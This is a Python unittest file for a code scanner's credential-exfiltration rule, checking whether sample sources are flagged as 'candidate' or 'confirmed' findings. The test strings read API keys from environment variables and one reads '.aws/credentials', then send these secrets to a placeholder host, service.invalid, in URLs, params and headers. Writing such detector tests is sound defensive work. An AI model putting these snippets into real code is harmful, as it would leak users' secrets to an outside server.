"""Authentication summaries preserve the actual argument's container shape."""

import unittest
from test_qindun_certify import MODULE


class PythonAuthParameterShapeTests(unittest.TestCase):
    def test_selected_mapping_scalar_retains_authentication(self):
        prefix = 'import os,requests\nkey=os.getenv("API_KEY")\n'
        for binding in (
            'fields={"key":key}\nvalue=fields["key"]\n',
            'value={"key":key}["key"]\n',
            'def selected(fields):\n    return fields["key"]\nvalue=selected({"key":key})\n',
        ):
            with self.subTest(binding=binding):
                hits, error = MODULE._python_flow_findings(
                    "main.py",
                    prefix + binding + 'requests.get(f"https://service.invalid/?key={value}")\n',
                )
                self.assertIsNone(error)
                self.assertEqual(
                    {
                        h.disposition
                        for h in hits
                        if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                    },
                    {"candidate"},
                )

    def test_auth_argument_shapes_across_helpers(self):
        calls = [
            'requests.get(f"https://service.invalid/?key={value}")',
            'requests.get("https://service.invalid/?key={}".format(value))',
            'requests.get("https://service.invalid/",params={"key":value})',
            'requests.get("https://service.invalid/",headers={"X-API-Key":value})',
        ]
        values = [
            ("key", "candidate"),
            ("[key,other]", "confirmed"),
            ("(key,other)", "confirmed"),
            ("{key,other}", "confirmed"),
            ('open(".aws/credentials").read()', "confirmed"),
            ('"public"', None),
            ('{"secret":key,"other":other}', "confirmed"),
            ('{"X-API-Key":key}', "confirmed"),
            ('{"nested":{"secret":key}}', "confirmed"),
            ('{"public":"text"}', None),
        ]
        prefix = 'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\nother=os.getenv("OTHER_SECRET")\n'
        for call in calls:
            for value, expected in values:
                for invocation in ("fetch(VALUE)", "fetch(value=VALUE)", "outer(VALUE)"):
                    with self.subTest(call=call, value=value, invocation=invocation):
                        source = prefix + f"def fetch(value):\n    {call}\n"
                        source += "def outer(value):\n    fetch(value)\n"
                        source += invocation.replace("VALUE", value) + "\n"
                        hits, error = MODULE._python_flow_findings("main.py", source)
                        self.assertIsNone(error)
                        dispositions = {
                            h.disposition
                            for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        }
                        self.assertEqual(dispositions, {expected} if expected else set())

    def test_same_helper_scalar_and_sequence_remain_distinct(self):
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_SECRET")\n'
            'def fetch(value):\n    requests.get("https://service.invalid/",params={"key":value})\n'
            "fetch(key)\nfetch([key,other])\n"
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )

    def test_same_helper_scalar_and_mapping_remain_distinct(self):
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_SECRET")\n'
            'def fetch(value):\n    requests.get("https://service.invalid/",params={"key":value})\n'
            'fetch(key)\nfetch({"secret":other})\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )

    def test_header_map_return_preserves_sequence(self):
        prefix = (
            'import os,requests\nkey=os.getenv("API_KEY")\n'
            'def header(value):\n    return {"X-API-Key":value}\n'
        )
        for value, expected in [
            ("key", "candidate"),
            ("[key]", "confirmed"),
            ('{"secret":key}', "confirmed"),
            ('{"X-API-Key":key}', "confirmed"),
        ]:
            with self.subTest(value=value):
                hits, error = MODULE._python_flow_findings(
                    "main.py",
                    prefix + f'requests.get("https://service.invalid/",headers=header({value}))\n',
                )
                self.assertIsNone(error)
                self.assertEqual(
                    {
                        h.disposition
                        for h in hits
                        if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                    },
                    {expected},
                )
